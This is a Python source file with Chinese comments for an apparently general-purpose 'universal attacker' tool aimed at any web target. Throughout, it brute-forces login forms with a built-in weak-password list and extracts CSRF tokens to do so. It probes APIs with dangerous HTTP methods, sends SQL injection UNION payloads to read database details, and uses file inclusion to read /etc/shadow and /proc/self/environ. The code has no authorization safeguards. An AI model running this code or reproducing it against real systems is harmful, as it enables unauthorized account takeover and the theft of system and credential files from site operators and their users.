#!/usr/bin/env python3
# 2026-05-11 优化
"""
⚔️ 通用攻击器 - 支持任意目标的智能攻击
"""

import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)


class UniversalAttacker:
    """通用攻击器"""

    def __init__(self, config: Dict):
        self.config = config.get('attack', {})
        self.brute_threads = self.config.get('brute_threads', 5)
        self.timeout = self.config.get('timeout', 10)
        self.max_attempts = self.config.get('max_attempts', 100)

        # 通用凭证库
        self.credential_library = self.load_credential_library()

        # 攻击模块
        self.attack_modules = self.load_attack_modules()

        print(f"⚔️  通用攻击器初始化 (线程: {self.brute_threads})")

    def load_credential_library(self) -> Dict[str, List[Tuple[str, str]]]:
        """加载通用凭证库"""
        return {
            'universal': [
                # 顶级通用凭证
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('administrator', 'admin'),
                ('administrator', 'password'),
                ('root', 'root'),
                ('root', 'toor'),
                ('root', '123456'),

                # 常见管理员
                ('admin@admin.com', 'admin'),
                ('admin@example.com', 'password'),
                ('webmaster', 'webmaster'),
                ('sysadmin', 'sysadmin'),
                ('operator', 'operator'),
                ('manager', 'manager'),

                # 测试账号
                ('test', 'test'),
                ('test', 'test123'),
                ('user', 'user'),
                ('user', 'user123'),
                ('guest', 'guest'),
                ('demo', 'demo'),

                # 数字组合
                ('admin', '12345678'),
                ('admin', '123456789'),
                ('admin', '1234567890'),
                ('admin', '111111'),
                ('admin', '000000'),
                ('admin', '888888'),

                # 字母组合
                ('admin', 'qwerty'),
                ('admin', 'abc123'),
                ('admin', 'password1'),
                ('admin', 'passw0rd'),
                ('admin', 'adminadmin'),
                ('admin', 'admin@123'),

                # 常见弱密码
                ('admin', 'welcome'),
                ('admin', 'monkey'),
                ('admin', 'letmein'),
                ('admin', 'dragon'),
                ('admin', 'baseball'),
                ('admin', 'football'),
                ('admin', 'master'),
                ('admin', 'hello'),
                ('admin', 'freedom'),
                ('admin', 'whatever'),
                ('admin', 'sunshine'),
                ('admin', 'password123'),
                ('admin', '123123'),
                ('admin', '12345'),
                ('admin', '1234'),
                ('admin', '123'),

                # 公司相关
                ('admin', 'company123'),
                ('admin', 'company@2023'),
                ('admin', 'welcome123'),
                ('admin', 'changeme'),
                ('admin', 'password!@#'),

                # 特殊字符
                ('admin', 'P@ssw0rd'),
                ('admin', 'Admin@123'),
                ('admin', 'Admin123!'),
                ('admin', 'Admin#123'),
            ],

            'cms_specific': {
                'wordpress': [
                    ('admin', 'admin'),
                    ('admin', 'password'),
                    ('wpadmin', 'wpadmin'),
                    ('wordpress', 'wordpress')
                ],
                'joomla': [
                    ('admin', 'admin'),
                    ('administrator', 'administrator'),
                    ('superuser', 'superuser')
                ],
                'drupal': [
                    ('admin', 'admin'),
                    ('admin', 'password'),
                    ('drupal', 'drupal')
                ]
            },

            'region_specific': {
                'china': [
                    ('admin', 'admin888'),
                    ('admin', '123456'),
                    ('admin', 'admin123'),
                    ('admin', '888888'),
                    ('administrator', '123456'),
                    ('root', '123456'),
                    ('admin', 'password'),
                    ('admin', 'admin@123'),
                    ('admin', 'P@ssw0rd'),
                    ('admin', 'Admin@123')
                ]
            }
        }

    def load_attack_modules(self) -> Dict:
        """加载攻击模块"""
        return {
            'authentication': self.attack_authentication,
            'api_security': self.attack_api,
            'vulnerability_exploit': self.exploit_vulnerabilities,
            'information_gathering': self.gather_information
        }

    def create_attack_plan(self, recon_info: Dict, scan_info: Dict) -> Dict:
        """创建攻击计划"""
        attack_plan = {
            'priority': [],
            'modules': [],
            'estimated_time': 0,
            'credentials_needed': False
        }

        # 根据侦察信息确定优先级

        # 1. 如果有认证入口，优先爆破
        if scan_info.get('authentication_points'):
            attack_plan['priority'].append('authentication')
            attack_plan['credentials_needed'] = True

        # 2. 如果有API接口，测试API安全
        if recon_info.get('api_detected') or any(
                path.get('type') == 'api_endpoint'
                for path in scan_info.get('sensitive_paths', [])
        ):
            attack_plan['priority'].append('api_security')

        # 3. 如果有漏洞，尝试利用
        if scan_info.get('vulnerabilities'):
            attack_plan['priority'].append('vulnerability_exploit')

        # 4. 信息收集
        attack_plan['priority'].append('information_gathering')

        # 估算时间
        if 'authentication' in attack_plan['priority']:
            attack_plan['estimated_time'] += 120  # 爆破2分钟
        if 'api_security' in attack_plan['priority']:
            attack_plan['estimated_time'] += 60  # API测试1分钟
        if 'vulnerability_exploit' in attack_plan['priority']:
            attack_plan['estimated_time'] += 90  # 漏洞利用1.5分钟

        attack_plan['estimated_time'] += 30  # 基础信息收集

        return attack_plan

    def test_authentication(self, target: str, auth_points: List[Dict]) -> List[Dict]:
        """测试认证机制"""
        results = []

        print(f"    测试 {len(auth_points)} 个认证入口...")

        for auth_point in auth_points:
            url = auth_point['url']
            auth_type = auth_point.get('type', 'login_page')

            print(f"      测试: {url}")

            # 分析登录表单
            form_info = self.analyze_login_form(url)

            if form_info:
                # 执行爆破
                brute_results = self.brute_force_login(url, form_info)

                results.append({
                    'auth_point': url,
                    'type': auth_type,
                    'form_analysis': form_info,
                    'brute_results': brute_results,
                    'success': brute_results.get('success', False)
                })
            else:
                # 无法分析表单，尝试默认凭证
                default_results = self.test_default_credentials(url)

                results.append({
                    'auth_point': url,
                    'type': auth_type,
                    'form_analysis': None,
                    'default_tests': default_results,
                    'success': default_results.get('success', False)
                })

        return results

    def analyze_login_form(self, url: str) -> Optional[Dict]:
        """分析登录表单"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })

            response = session.get(url, timeout=10, verify=False)
            content = response.text

            form_info = {
                'url': url,
                'action': url,
                'method': 'POST',
                'username_field': 'username',
                'password_field': 'password',
                'csrf_present': False,
                'captcha_present': False,
                'fields': []
            }

            # 查找表单
            form_match = re.search(r'<form[^>]*>(.*?)</form>', content, re.IGNORECASE | re.DOTALL)
            if not form_match:
                return None

            form_html = form_match.group(0)

            # 提取action
            action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form_html, re.I)
            if action_match:
                action = action_match.group(1).strip()
                if action:
                    if not action.startswith(('http://', 'https://', '//')):
                        action = urljoin(url, action)
                    form_info['action'] = action

            # 提取method
            method_match = re.search(r'method\s*=\s*["\']([^"\']+)["\']', form_html, re.I)
            if method_match:
                form_info['method'] = method_match.group(1).upper()

            # 查找所有输入字段
            input_tags = re.findall(r'<input[^>]*>', form_html, re.I)

            for tag in input_tags:
                name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
                if name_match:
                    field_name = name_match.group(1)
                    field_info = {'name': field_name}

                    # 字段类型
                    type_match = re.search(r'type\s*=\s*["\']([^"\']+)["\']', tag, re.I)
                    field_info['type'] = type_match.group(1).lower() if type_match else 'text'

                    # 值
                    value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
                    field_info['value'] = value_match.group(1) if value_match else ''

                    form_info['fields'].append(field_info)

                    # 识别关键字段
                    tag_lower = tag.lower()
                    field_lower = field_name.lower()

                    if 'type="password"' in tag_lower:
                        form_info['password_field'] = field_name

                    elif any(keyword in field_lower for keyword in ['user', 'name', 'login', 'account', 'email']):
                        if form_info['username_field'] == 'username':  # 只设置第一个匹配的
                            form_info['username_field'] = field_name

                    elif any(keyword in field_lower for keyword in ['token', 'csrf', '_token', 'nonce']):
                        form_info['csrf_present'] = True

                    elif any(keyword in field_lower for keyword in ['captcha', 'code', 'verify']):
                        form_info['captcha_present'] = True

            # 如果没有找到密码字段，尝试其他方式识别
            if form_info['password_field'] == 'password':
                for field in form_info['fields']:
                    if field.get('type') == 'password':
                        form_info['password_field'] = field['name']
                        break

            return form_info

        except Exception as e:
            logger.error(f"表单分析失败: {e}")
            return None

    def brute_force_login(self, url: str, form_info: Dict) -> Dict:
        """暴力破解登录"""
        print(f"        执行爆破测试...")

        # 选择凭证
        credentials = self.select_credentials(form_info)

        found = []
        tested = 0

        with ThreadPoolExecutor(max_workers=self.brute_threads) as executor:
            future_to_cred = {}

            for username, password in credentials[:self.max_attempts]:
                future = executor.submit(
                    self.test_login_credential,
                    url, form_info, username, password
                )
                future_to_cred[future] = (username, password)

            for future in as_completed(future_to_cred):
                tested += 1

                # 显示进度
                if tested % 10 == 0:
                    print(f"        进度: {tested}/{min(len(credentials), self.max_attempts)}", end='\r')

                try:
                    result = future.result(timeout=self.timeout + 5)
                    if result.get('success'):
                        username, password = future_to_cred[future]
                        found.append({
                            'username': username,
                            'password': password,
                            'evidence': result.get('evidence', [])
                        })
                        print(f"\n        🎉 发现凭证: {username}:{password}")

                        # 发现3个就停止
                        if len(found) >= 3:
                            executor.shutdown(wait=False)
                            break

                except:
                    pass

            print(f"        进度: {tested}/{min(len(credentials), self.max_attempts)} 完成")

        return {
            'success': len(found) > 0,
            'credentials_found': found,
            'total_tested': tested,
            'success_rate': len(found) / tested * 100 if tested > 0 else 0
        }

    def select_credentials(self, form_info: Dict) -> List[Tuple[str, str]]:
        """选择凭证"""
        credentials = []

        # 添加通用凭证
        credentials.extend(self.credential_library['universal'])

        # 根据可能的CMS添加特定凭证
        if form_info.get('cms_hint'):
            cms = form_info['cms_hint']
            if cms in self.credential_library['cms_specific']:
                credentials.extend(self.credential_library['cms_specific'][cms])

        # 添加中文环境常见凭证
        credentials.extend(self.credential_library['region_specific']['china'])

        # 去重
        seen = set()
        unique_credentials = []
        for cred in credentials:
            if cred not in seen:
                seen.add(cred)
                unique_credentials.append(cred)

        return unique_credentials[:self.max_attempts]

    def test_login_credential(self, url: str, form_info: Dict,
                              username: str, password: str) -> Dict:
        """测试登录凭证"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': url
            })

            # 获取页面（用于CSRF token）
            response = session.get(url, timeout=self.timeout, verify=False)

            # 准备数据
            data = {
                form_info['username_field']: username,
                form_info['password_field']: password
            }

            # 提取CSRF token（如果有）
            if form_info['csrf_present']:
                csrf_token = self.extract_csrf_token(response.text)
                if csrf_token:
                    csrf_field = self.find_csrf_field(response.text)
                    if csrf_field:
                        data[csrf_field] = csrf_token

            # 提交登录
            login_response = session.post(
                form_info['action'],
                data=data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            # 判断是否成功
            success, evidence = self.is_login_successful(login_response, username)

            return {
                'success': success,
                'evidence': evidence,
                'status_code': login_response.status_code,
                'final_url': login_response.url
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def extract_csrf_token(self, html: str) -> Optional[str]:
        """提取CSRF token"""
        patterns = [
            r'name=["\'][^"\']*csrf[^"\']*["\'][^>]*value=["\']([^"\']+)["\']',
            r'value=["\']([^"\']+)["\'][^>]*name=["\'][^"\']*csrf[^"\']*["\']',
            r'csrf.*?value=["\']([^"\']+)["\']',
            r'_token.*?value=["\']([^"\']+)["\']'
        ]

        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1)

        return None

    def find_csrf_field(self, html: str) -> Optional[str]:
        """查找CSRF字段名"""
        patterns = [
            r'name=["\']([^"\']*csrf[^"\']*)["\']',
            r'name=["\']([^"\']*_token[^"\']*)["\']',
            r'id=["\']([^"\']*csrf[^"\']*)["\']'
        ]

        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1)

        return None

    def is_login_successful(self, response, username: str) -> Tuple[bool, List[str]]:
        """判断登录是否成功"""
        evidence = []
        url_lower = response.url.lower()
        content_lower = response.text.lower()

        # 成功迹象（通用）
        success_indicators = [
            ('logout', '登出链接'),
            ('log out', '登出链接'),
            ('sign out', '登出链接'),
            ('welcome', '欢迎信息'),
            ('dashboard', '控制面板'),
            ('my account', '我的账户'),
            ('profile', '个人资料'),
            ('登录成功', '成功提示'),
            ('登录成功', '成功提示'),
            ('successfully', '成功登录'),
            ('successful', '成功'),
            ('authenticated', '已认证')
        ]

        # 失败迹象
        failure_indicators = [
            ('invalid', '无效'),
            ('incorrect', '不正确'),
            ('wrong', '错误'),
            ('failed', '失败'),
            ('error', '错误'),
            ('try again', '重试'),
            ('login failed', '登录失败'),
            ('登录失败', '失败提示'),
            ('用户名或密码', '凭证错误'),
            ('password is wrong', '密码错误')
        ]

        # 检查成功
        for indicator, description in success_indicators:
            if indicator in content_lower or indicator in url_lower:
                evidence.append(description)
                return True, evidence

        # 检查失败
        for indicator, description in failure_indicators:
            if indicator in content_lower:
                evidence.append(description)
                return False, evidence

        # 其他判断

        # 1. URL变化且不是登录相关页面
        if response.history:
            final_url = response.url.lower()
            if not any(keyword in final_url for keyword in ['login', 'auth', 'signin']):
                evidence.append('重定向到非登录页面')
                return True, evidence

        # 2. 设置了认证Cookie
        cookies = str(response.cookies).lower()
        auth_cookies = ['session', 'auth', 'token', 'jwt', 'sess', 'sid']
        for cookie in auth_cookies:
            if cookie in cookies:
                evidence.append(f'设置认证Cookie: {cookie}')
                return True, evidence

        # 3. 用户名出现在页面中
        if username.lower() in content_lower:
            evidence.append('用户名出现在页面中')
            return True, evidence

        # 4. 页面内容大幅变化
        if len(response.text) > 5000:  # 大页面可能是成功
            evidence.append('大响应页面')
            return True, evidence

        return False, ['无法确定登录状态']

    def test_default_credentials(self, url: str) -> Dict:
        """测试默认凭证"""
        print("        测试默认凭证...")

        # 常见默认凭证对
        default_tests = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'admin'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest')
        ]

        success = False
        found = None

        for username, password in default_tests:
            try:
                # 尝试简单POST
                data = {'username': username, 'password': password}
                response = requests.post(url, data=data, timeout=5, verify=False)

                if self.is_login_successful(response, username)[0]:
                    success = True
                    found = (username, password)
                    print(f"        🎉 默认凭证有效: {username}:{password}")
                    break

            except:
                continue

        return {
            'success': success,
            'credential_found': found,
            'total_tested': len(default_tests)
        }

    def test_api_security(self, target: str) -> List[Dict]:
        """测试API安全"""
        print("    测试API安全...")

        results = []

        # 1. 寻找API端点
        api_endpoints = self.find_api_endpoints(target)

        for endpoint in api_endpoints[:5]:  # 测试前5个
            endpoint_results = self.test_single_api(endpoint)
            results.extend(endpoint_results)

        return results

    def find_api_endpoints(self, target: str) -> List[str]:
        """寻找API端点"""
        endpoints = []

        # 常见API路径
        common_api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/api', '/graphql',
            '/soap', '/xmlrpc', '/jsonrpc',
            '/swagger', '/swagger-ui', '/openapi',
            '/docs', '/api-docs', '/redoc'
        ]

        for path in common_api_paths:
            url = urljoin(target, path)
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code in [200, 301, 302]:
                    endpoints.append(url)
                    print(f"        发现API: {url}")
            except:
                pass

        return endpoints

    def test_single_api(self, endpoint: str) -> List[Dict]:
        """测试单个API"""
        tests = []

        # 1. 检查认证
        auth_test = self.test_api_authentication(endpoint)
        if auth_test:
            tests.append(auth_test)

        # 2. 检查HTTP方法
        method_test = self.test_api_methods(endpoint)
        if method_test:
            tests.append(method_test)

        # 3. 检查信息泄露
        info_test = self.test_api_info_disclosure(endpoint)
        if info_test:
            tests.append(info_test)

        return tests

    def test_api_authentication(self, endpoint: str) -> Optional[Dict]:
        """测试API认证"""
        try:
            # 尝试未认证访问
            response = requests.get(endpoint, timeout=5, verify=False)

            if response.status_code == 200:
                # 检查是否返回敏感信息
                content = response.text.lower()
                sensitive_keywords = ['password', 'secret', 'key', 'token', 'database']

                if any(keyword in content for keyword in sensitive_keywords):
                    return {
                        'type': 'api_authentication_bypass',
                        'severity': 'high',
                        'endpoint': endpoint,
                        'description': 'API端点无需认证即可访问敏感数据',
                        'recommendation': '实施适当的API认证机制'
                    }

        except:
            pass

        return None

    def test_api_methods(self, endpoint: str) -> Optional[Dict]:
        """测试API HTTP方法"""
        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE']

        for method in dangerous_methods:
            try:
                response = requests.request(method, endpoint, timeout=5, verify=False)

                if response.status_code not in [405, 403, 401]:
                    return {
                        'type': 'dangerous_api_method',
                        'severity': 'medium',
                        'endpoint': endpoint,
                        'method': method,
                        'description': f'启用了危险的HTTP方法: {method}',
                        'recommendation': '禁用不必要的HTTP方法'
                    }

            except:
                continue

        return None

    def test_api_info_disclosure(self, endpoint: str) -> Optional[Dict]:
        """测试API信息泄露"""
        try:
            response = requests.get(endpoint, timeout=5, verify=False)
            content = response.text

            # 检查错误信息
            error_indicators = [
                'stack trace', 'exception', 'error at line',
                'database error', 'sql error', 'warning:',
                'fatal error', 'syntax error'
            ]

            for indicator in error_indicators:
                if indicator.lower() in content.lower():
                    return {
                        'type': 'api_error_disclosure',
                        'severity': 'medium',
                        'endpoint': endpoint,
                        'description': 'API返回详细的错误信息',
                        'recommendation': '禁用详细错误信息显示'
                    }

        except:
            pass

        return None

    def exploit_vulnerabilities(self, target: str, vulnerabilities: List[Dict]) -> List[Dict]:
        """利用漏洞"""
        print(f"    尝试利用 {len(vulnerabilities)} 个漏洞...")

        exploits = []

        for vuln in vulnerabilities[:3]:  # 只尝试前3个
            vuln_type = vuln.get('type', '')

            if vuln_type == 'sql_injection':
                exploit = self.exploit_sql_injection(target, vuln)
                if exploit:
                    exploits.append(exploit)

            elif vuln_type == 'xss':
                exploit = self.exploit_xss(target, vuln)
                if exploit:
                    exploits.append(exploit)

            elif vuln_type == 'file_inclusion':
                exploit = self.exploit_file_inclusion(target, vuln)
                if exploit:
                    exploits.append(exploit)

        return exploits

    def exploit_sql_injection(self, target: str, vuln: Dict) -> Optional[Dict]:
        """利用SQL注入"""
        try:
            url = vuln.get('url', '')
            payload = vuln.get('payload', "'")

            # 尝试获取数据库信息
            info_payloads = [
                ("' UNION SELECT version(),2,3--", "数据库版本"),
                ("' UNION SELECT user(),2,3--", "当前用户"),
                ("' UNION SELECT database(),2,3--", "当前数据库")
            ]

            for info_payload, description in info_payloads:
                test_url = url.replace(payload, info_payload)
                response = requests.get(test_url, timeout=5, verify=False)

                # 查找数据库信息
                if '5.' in response.text or '8.' in response.text:  # MySQL版本
                    return {
                        'type': 'sql_injection_exploit',
                        'severity': 'high',
                        'vulnerability': 'SQL注入',
                        'exploit': '信息获取',
                        'description': f'成功获取{description}',
                        'url': test_url
                    }

        except:
            pass

        return None

    def exploit_xss(self, target: str, vuln: Dict) -> Optional[Dict]:
        """利用XSS"""
        # XSS通常需要手动验证，这里只记录
        return {
            'type': 'xss_verification',
            'severity': 'medium',
            'vulnerability': 'XSS',
            'exploit': '需要手动验证',
            'description': 'XSS漏洞需要进一步验证利用',
            'url': vuln.get('url', '')
        }

    def exploit_file_inclusion(self, target: str, vuln: Dict) -> Optional[Dict]:
        """利用文件包含"""
        # 尝试读取更多文件
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/self/environ',
            '../../../../windows/win.ini',
            '../../../../boot.ini'
        ]

        url_template = vuln.get('url', '')

        for file in sensitive_files:
            try:
                test_url = url_template.replace('../../../../etc/passwd', file)
                response = requests.get(test_url, timeout=5, verify=False)

                if 'root:' in response.text or '[boot loader]' in response.text:
                    return {
                        'type': 'file_inclusion_exploit',
                        'severity': 'high',
                        'vulnerability': '文件包含',
                        'exploit': '敏感文件读取',
                        'description': f'成功读取文件: {file}',
                        'url': test_url,
                        'content_preview': response.text[:200]
                    }

            except:
                continue

        return None

    def gather_information(self, target: str) -> Dict:
        """信息收集"""
        print("    执行信息收集...")

        info = {
            'subdomains': [],
            'technologies': [],
            'sensitive_files': [],
            'directory_listings': []
        }

        # 这里可以扩展为更完整的信息收集
        # 例如：子域名枚举、技术指纹识别等

        return info


# 测试函数
def test_attacker():
    """测试攻击器"""
    print("=" * 60)
    print("🧪 通用攻击器测试")
    print("=" * 60)

    config = {
        'attack': {
            'brute_threads': 3,
            'timeout': 10,
            'max_attempts': 50
        }
    }

    attacker = UniversalAttacker(config)

    # 测试创建攻击计划
    recon_info = {
        'tech_stack': ['PHP'],
        'cms': None,
        'api_detected': False
    }

    scan_info = {
        'authentication_points': [
            {'url': 'http://example.com/login', 'type': 'login_page', 'status': 200}
        ],
        'vulnerabilities': []
    }

    attack_plan = attacker.create_attack_plan(recon_info, scan_info)
    print(f"攻击计划: {attack_plan['priority']}")
    print(f"预计时间: {attack_plan['estimated_time']}秒")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_attacker()
